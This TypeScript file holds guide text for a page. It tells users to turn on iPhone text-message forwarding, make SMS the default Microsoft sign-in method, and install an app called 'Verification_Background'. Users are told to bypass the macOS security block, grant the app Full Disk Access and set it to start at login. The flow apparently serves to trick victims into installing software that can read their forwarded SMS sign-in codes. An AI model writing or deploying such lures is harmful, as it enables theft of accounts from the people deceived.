const iphoneSteps: string[] = [
	"Go to your Iphones settings.",
	'In the settings, search for "Text Message Forwarding".',
	"If not yet, turn it on.",
];

export type Guide = { header: string; steps: string[] };

export const forwardMessages: Guide = {
	header: "Forward messages from your Iphone",
	steps: iphoneSteps,
};

const microsoftPhone: string[] = [
	"Sign in to microsoft and navigate to your account.",
	'Go to "Security info".',
	"Add your phone number as a new sign in method, and enabled it.",
	"Change a text message to be the default method sign in method.",
];

export const phoneNumberToMicrosoft: Guide = {
	header: "Add your phone number to your microsoft account",
	steps: microsoftPhone,
};

const downloadSteps: string[] = [
	"Click the DOWNLOAD button and save Verification_Background-1.0.dmg.",
	"Open Verification_Background-1.0.dmg from your Downloads.",
	"In the window that opens, drag Verification_Background.app onto the Applications shortcut.",
	"Optional: Eject the mounted volume named “Verification_Background” from Finder’s sidebar.",
];

export const downloadProgram: Guide = {
	header: "Download and install",
	steps: downloadSteps,
};

/* 2) First run (allow the app in Privacy & Security) */
const firstRunSteps: string[] = [
	"Open Applications in Finder and try to open Verification_Background once. It will not open! Continue with the steps below.",
	"Open System Settings → Privacy & Security.",
	"Scroll to the Security section. You should see a message that Verification_Background was blocked.",
	"Click Open Anyway.",
	"When asked again, confirm by clicking Open.",
	"You only need to do this once. Future launches will be normal.",
];

export const firstRunOpen: Guide = {
	header: "First run (allow in Privacy & Security)",
	steps: firstRunSteps,
};

/* 3) Grant Full Disk Access (required once) */
const diskCoverageSteps: string[] = [
	"Open System Settings → Privacy & Security → Full Disk Access.",
	"Click the + button, choose Applications, select Verification_Background.app, then click Open.",
	"Turn the toggle on for Verification_Background.",
	"If you later replace the app with a new version, you may need to re-add it here.",
];

export const fullDiskAccess: Guide = {
	header: "Give the program Full Disk Access",
	steps: diskCoverageSteps,
};

/* 4) Start automatically at login */
const loginItemsSteps: string[] = [
	"Open System Settings → General → Login Items.",
	"Under Open at Login, click the + button.",
	"Select Verification_Background from Applications and click Open.",
	"Confirm it appears in the list and is enabled.",
];

export const addToLoginItems: Guide = {
	header: "Make it start automatically at login",
	steps: loginItemsSteps,
};

/* 5) Verify it is running */
const verifySteps: string[] = [
	"Open Activity Monitor.",
	"Search for Verification_Background.",
	"You should see a process like: Verification_Background",
	"If you do not see it, open Applications and double-click Verification_Background to start it, or reboot your Mac.",
];

export const verifyRunning: Guide = {
	header: "Verify that it is running",
	steps: verifySteps,
};
